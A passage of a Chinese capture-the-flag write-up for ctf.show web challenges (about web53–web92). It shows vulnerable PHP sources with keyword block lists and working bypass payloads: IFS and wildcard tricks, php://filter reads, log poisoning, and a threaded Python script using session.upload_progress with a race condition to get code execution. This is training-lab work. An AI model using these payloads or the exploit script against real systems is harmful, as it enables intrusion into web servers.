class="string">&quot;&lt;br&gt;&quot;</span>.$d;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;no&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c&#x3D;nl$&#123;IFS&#125;fla&#39;&#39;g.php</span><br></pre></td></tr></table></figure><h3 id="web54">web54</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    $c=$_GET[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|.*c.*a.*t.*|.*f.*l.*a.*g.*| |[0-9]|\*|.*m.*o.*r.*e.*|.*w.*g.*e.*t.*|.*l.*e.*s.*s.*|.*h.*e.*a.*d.*|.*s.*o.*r.*t.*|.*t.*a.*i.*l.*|.*s.*e.*d.*|.*c.*u.*t.*|.*t.*a.*c.*|.*a.*w.*k.*|.*s.*t.*r.*i.*n.*g.*s.*|.*o.*d.*|.*c.*u.*r.*l.*|.*n.*l.*|.*s.*c.*p.*|.*r.*m.*|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;</span>, $c))&#123;</span><br><span class="line">        system($c);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c&#x3D;grep$&#123;IFS&#125;&#39;&#39;$&#123;IFS&#125;????.php</span><br></pre></td></tr></table></figure><h3 id="web55">**web55</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: Lazzaro</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-05 20:49:30</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-07 20:03:51</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 你们在炫技吗？</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    $c=$_GET[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|[a-z]|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;</span>, $c))&#123;</span><br><span class="line">        system($c);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个题还是可以的，思路P神也提到过https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html</p><p>具体思路还是看P神的讲解，简单来说就是在上传文件的时候，PHP会在/tmp目录下生成一个临时文件，比如<code>/tmp/phpcjggLC</code>，我们可以上传一个bash文件，然后利用Linux通配符和<code>.</code>命令来运行这个脚本文件。</p><p>首先构造一个上传页面：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>POST数据包POC<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;http://bb128af7-7ae6-40b9-81f2-f1797563529f.chall.ctf.show/&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--链接是当前打开的题目链接--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;file&quot;</span>&gt;</span>Filename：<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;file&quot;</span> <span class="attr">id</span>=<span class="string">&quot;file&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">name</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;提交&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>然后抓包，更改包的数据：</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201019202120.png" alt=""></p><h3 id="web56">web56</h3><p>沿用上一题的payload。</p><h3 id="web57">**web57</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 还能炫的动吗？</span></span><br><span class="line"><span class="comment">//flag in 36.php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    $c=$_GET[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|[a-z]|[0-9]|\`|\|\#|\&#x27;|\&quot;|\`|\%|\x09|\x26|\x0a|\&gt;|\&lt;|\.|\,|\?|\*|\-|\=|\[/i&quot;</span>, $c))&#123;</span><br><span class="line">        system(<span class="string">&quot;cat &quot;</span>.$c.<span class="string">&quot;.php&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>来学骚姿势了。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))</span><br></pre></td></tr></table></figure><p>解释一下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$(())   &#x3D;&#x3D;&gt; 0</span><br><span class="line">$((~$(())))   &#x3D;&#x3D;&gt; -1</span><br><span class="line">$(($((~$(())))$((~$(())))))  &#x3D;&#x3D;&gt; -2</span><br><span class="line">......</span><br><span class="line">$((~-37))   &#x3D;&#x3D;&gt; 36</span><br></pre></td></tr></table></figure><h3 id="web58-59">web58&amp;59</h3><p>蚁剑连接</p><h3 id="web60">web60</h3><p>蚁剑连接 + <a href="https://github.com/Medicean/as_bypass_php_disable_functions">插件绕过</a></p><h3 id="web61-70">web61-70</h3><p>命令执行+文件包含</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201020101508.png" alt=""></p><h3 id="web71">**web71</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">ini_set(<span class="string">&#x27;display_errors&#x27;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="comment">// 你们在炫技吗？</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">        $c= $_POST[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">        <span class="keyword">eval</span>($c);</span><br><span class="line">        $s = ob_get_contents();</span><br><span class="line">        ob_end_clean();</span><br><span class="line">        <span class="keyword">echo</span> preg_replace(<span class="string">&quot;/[0-9]|[a-z]/i&quot;</span>,<span class="string">&quot;?&quot;</span>,$s);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">你要上天吗？</span><br></pre></td></tr></table></figure><p>做这个题的时候思路走偏了，一直想着用convert编码方式绕过。</p><p>payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c&#x3D;include(&#39;flag.txt&#39;);exit();</span><br></pre></td></tr></table></figure><p>还有一个更牛逼的</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c&#x3D;include(&#39;flag.txt&#39;);echo ~ob_get_content();</span><br></pre></td></tr></table></figure><p>然后再对每个字符&amp;0xff再取反。</p><h3 id="web72">**web72</h3><p>代码和上一道题是一样的。</p><p>还是不会，找个wp瞅瞅学一学。</p><h2 id="web入门-文件包含">web入门 文件包含</h2><h3 id="web78">web78</h3><p>最简单的文件包含利用</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php</span><br></pre></td></tr></table></figure><h3 id="web79">web79</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    $file = $_GET[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    $file = str_replace(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;???&quot;</span>, $file);</span><br><span class="line">    <span class="keyword">include</span>($file);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以通过UserAgent写shell</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201020214817.png" alt=""></p><p>然后再包含日志文件</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201020214840.png" alt=""></p><p>不过也还可以用data伪协议写入webshell。</p><h3 id="web80">web80</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    $file = $_GET[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    $file = str_replace(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;???&quot;</span>, $file);</span><br><span class="line">    $file = str_replace(<span class="string">&quot;data&quot;</span>, <span class="string">&quot;???&quot;</span>, $file);</span><br><span class="line">    <span class="keyword">include</span>($file);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这次过滤了data和php，但是还是可以通过大小写Php://input绕过</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201021083531.png" alt=""></p><h3 id="web81">web81</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    $file = $_GET[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    $file = str_replace(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;???&quot;</span>, $file);</span><br><span class="line">    $file = str_replace(<span class="string">&quot;data&quot;</span>, <span class="string">&quot;???&quot;</span>, $file);</span><br><span class="line">    $file = str_replace(<span class="string">&quot;:&quot;</span>, <span class="string">&quot;???&quot;</span>, $file);</span><br><span class="line">    <span class="keyword">include</span>($file);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>第一种解法同web79。</p><p>第二种解法是通过session.upload_progress和条件竞争GetShell，exp：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import io</span><br><span class="line">import threading</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;&quot;</span><span class="string">&quot;http://15b479e2-6c40-4f72-a293-5562a7523e29.chall.ctf.show/&quot;</span><span class="string">&quot;&quot;</span></span><br><span class="line">sessid = <span class="string">&quot;ca01h&quot;</span></span><br><span class="line">cookie = &#123;</span><br><span class="line">    <span class="string">&quot;PHPSESSID&quot;</span>: sessid</span><br><span class="line">&#125;</span><br><span class="line">proxy = &#123;<span class="string">&quot;http&quot;</span>: <span class="string">&quot;127.0.0.1:8080&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def write(session):</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        files = &#123;</span><br><span class="line">            <span class="string">&quot;upload&quot;</span>: io.BytesIO(<span class="string">b&#x27;a&#x27;</span> * <span class="number">1024</span>)</span><br><span class="line">        &#125;</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span>: <span class="string">&quot;&lt;?php system(&#x27;ls&#x27;);echo &#x27;ca01h&#x27;;?&gt;&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">        session.post(url=url, files=files, data=data, cookies=cookie)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def read(session):</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        req = session.get(url=url+<span class="string">&#x27;?file=/tmp/sess_&#x27;</span>+sessid)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;ca01h&#x27;</span> in req.text:</span><br><span class="line">            <span class="keyword">print</span>(req.text)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            pass</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i in range(<span class="number">50</span>):</span><br><span class="line">    with requests.session() <span class="keyword">as</span> session:</span><br><span class="line">        threading.Thread(target=write, args=(session,)).start()</span><br><span class="line">        threading.Thread(target=read, args=(session,)).start()</span><br></pre></td></tr></table></figure><h3 id="web82-86">web82-86</h3><p><a href="https://ca0y1h.top/Web_security/php_related/13.session.upload_progress+LFI%E5%AE%9E%E7%8E%B0RCE/">https://ca0y1h.top/Web_security/php_related/13.session.upload_progress+LFI实现RCE/</a></p><p>其中web85</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    $file = $_GET[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    $file = str_replace(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;???&quot;</span>, $file);</span><br><span class="line">    $file = str_replace(<span class="string">&quot;data&quot;</span>, <span class="string">&quot;???&quot;</span>, $file);</span><br><span class="line">    $file = str_replace(<span class="string">&quot;:&quot;</span>, <span class="string">&quot;???&quot;</span>, $file);</span><br><span class="line">    $file = str_replace(<span class="string">&quot;.&quot;</span>, <span class="string">&quot;???&quot;</span>, $file);</span><br><span class="line">    <span class="keyword">if</span>(file_exists($file))&#123;</span><br><span class="line">        $content = file_get_contents($file);</span><br><span class="line">        <span class="keyword">if</span>(strpos($content, <span class="string">&quot;&lt;&quot;</span>)&gt;<span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;error&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">include</span>($file);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="web87-TODO">**web87[TODO]</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    $file = $_GET[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    $content = $_POST[<span class="string">&#x27;content&#x27;</span>];</span><br><span class="line">    $file = str_replace(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;???&quot;</span>, $file);</span><br><span class="line">    $file = str_replace(<span class="string">&quot;data&quot;</span>, <span class="string">&quot;???&quot;</span>, $file);</span><br><span class="line">    $file = str_replace(<span class="string">&quot;:&quot;</span>, <span class="string">&quot;???&quot;</span>, $file);</span><br><span class="line">    $file = str_replace(<span class="string">&quot;.&quot;</span>, <span class="string">&quot;???&quot;</span>, $file);</span><br><span class="line">    file_put_contents(urldecode($file), <span class="string">&quot;&lt;?php die(&#x27;大佬别秀了&#x27;);?&gt;&quot;</span>.$content);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>参考文章：<a href="https://www.leavesongs.com/PENETRATION/php-filter-magic.html">https://www.leavesongs.com/PENETRATION/php-filter-magic.html</a></p><p>思路：两次URLencode编码绕过过滤，php://filter绕过死亡退出，其中有两种方法都可以bypass。</p><p>第一种方法使用base64 decode编码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php:&#x2F;&#x2F;filter&#x2F;write&#x3D;convert.base64-decode&#x2F;resource&#x3D;a.php</span><br></pre></td></tr></table></figure><p>第二种方法使用strip_tags，但是PHP版本太高，strip_tags已经不让用了。</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201021155449.png" alt=""></p><h2 id="web入门-PHP特性">web入门 PHP特性</h2><h3 id="web89">web89</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    $num = $_GET[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/[0-9]/&quot;</span>, $num))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(intval($num))&#123;</span><br><span class="line">        <span class="keyword">echo</span> $flag;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>数组绕过</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?num[]&#x3D;1</span><br></pre></td></tr></table></figure><h3 id="web90">web90</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    $num = $_GET[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>($num===<span class="string">&quot;4476&quot;</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(intval($num,<span class="number">0</span>)===<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> $flag;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> intval($num,<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>小数点或字母绕过</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?num&#x3D;4476a</span><br><span class="line">?num&#x3D;4476.1</span><br></pre></td></tr></table></figure><h3 id="web91">web91</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line">$a=$_GET[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/^php$/im&#x27;</span>, $a))&#123;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/^php$/i&#x27;</span>, $a))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;hacker&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> $flag;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;nonononono&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>换行符绕过</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?cmd&#x3D;%0aphp</span><br></pre></td></tr></table></figure><h3 id="web92">web92</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span 